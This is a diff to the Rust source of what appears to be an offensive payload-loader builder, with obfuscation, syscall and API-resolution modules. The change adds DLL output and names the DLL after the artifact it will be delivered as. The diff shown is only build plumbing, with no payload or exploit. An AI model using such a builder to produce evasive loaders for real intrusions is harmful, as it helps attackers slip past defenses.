@@ -26,7 +26,7 @@ use clap::{CommandFactory, Parser, Subcommand};
 use engine::{api_resolution, compiler, crypto, obfuscation, pe, steps, stub, syscalls};
 use error::Result;
 use plan::schema::{
-    Arch, CryptoAlgorithm, KeySource, PayloadFormat, PayloadPlan, Subsystem, TrimPaths,
+    Arch, CryptoAlgorithm, KeySource, OutputKind, PayloadFormat, PayloadPlan, Subsystem, TrimPaths,
 };
 use plan::steps::ResolvedStep;
 use techniques::{Category, RuntimeStep};
@@ -567,6 +567,8 @@ fn build(
         build_args: build_args.clone(),
         debug,
         windows_subsystem: plan.build.output.subsystem == Subsystem::Windows,
+        kind: plan.build.output.kind,
+        entry: plan.build.output.entry.clone(),
     };
     let stub_src = if is_custom {
         stub::validate_custom_stub_template(&template)?;
@@ -579,7 +581,13 @@ fn build(
     } else {
         steps::render_builtin(&template, &params, &strings, &syscalls, &api_resolution)?
     };
-    let stub_src = apply_subsystem(stub_src, plan.build.output.subsystem);
+    // A DLL has no subsystem: the host's applies, and `#![windows_subsystem]`
+    // would be ignored (or, worse, silently taken as an instruction).
+    let stub_src = if plan.build.output.kind == OutputKind::Exe {
+        apply_subsystem(stub_src, plan.build.output.subsystem)
+    } else {
+        stub_src
+    };
     let stub_path = build_dir.join("main.rs");
     std::fs::write(&stub_path, &stub_src)?;
     let stub_time = timer.elapsed();
@@ -589,6 +597,13 @@ fn build(
         format!("{} {}", ui.dim("strings"), strings.strategy.label()),
         format!("{} {}", ui.dim("syscalls"), syscalls.mode.label()),
     ];
+    if plan.build.output.kind == OutputKind::Dll {
+        stub_parts.push(ui.brand(format!(
+            "{} {}",
+            plan.build.output.kind.label(),
+            plan.build.output.entry.label()
+        )));
+    }
     if debug {
         stub_parts.push(ui.warn("debug"));
     }
@@ -617,7 +632,7 @@ fn build(
     let timer = Instant::now();
     let arch = plan.build.output.arch;
     let deps = compiler::locate_stub_deps(arch)?;
-    let out = build_dir.join("out.exe");
+    let out = intermediate_path(&build_dir, &plan.build.output);
     let options = compiler::CompileOptions {
         strip: plan.build.output.strip,
         trim_paths: match plan.build.output.trim_paths {
@@ -627,6 +642,7 @@ fn build(
         },
         debug,
         arch,
+        kind: plan.build.output.kind,
     };
     compiler::compile_stub(&stub_path, &out, &deps, options)?;
     // D-21: a proxy must never import the API it intercepts, or the signature
@@ -682,7 +698,7 @@ fn build(
         }
     }
 
-    // 6. Copy `out.exe` to the output path from the YAML.
+    // 6. Copy the compiled stub to the output path from the YAML.
     if let Some(parent) = plan.build.output.path.parent() {
         if !parent.as_os_str().is_empty() {
             std::fs::create_dir_all(parent)?;
@@ -1238,6 +1254,26 @@ fn apply_subsystem(source: String, subsystem: Subsystem) -> String {
         out
     } else {
         source
+    }
+}
+
+/// Where the compiled stub is written inside the build directory.
+///
+/// An executable keeps the fixed `out.exe`. A DLL is named after the artifact
+/// the operator asked for: the linker records the link output's name inside the
+/// PE (the export directory's `Name` field), so the file should report the name
+/// it will be delivered under rather than the build's scratch name.
+fn intermediate_path(build_dir: &Path, output: &plan::schema::OutputPlan) -> PathBuf {
+    match output.kind {
+        OutputKind::Exe => build_dir.join("out.exe"),
+        OutputKind::Dll => {
+            let stem = output
+                .path
+                .file_stem()
+                .and_then(|stem| stem.to_str())
+                .unwrap_or("loader");
+            build_dir.join(format!("{stem}.dll"))
+        }
     }
 }
 
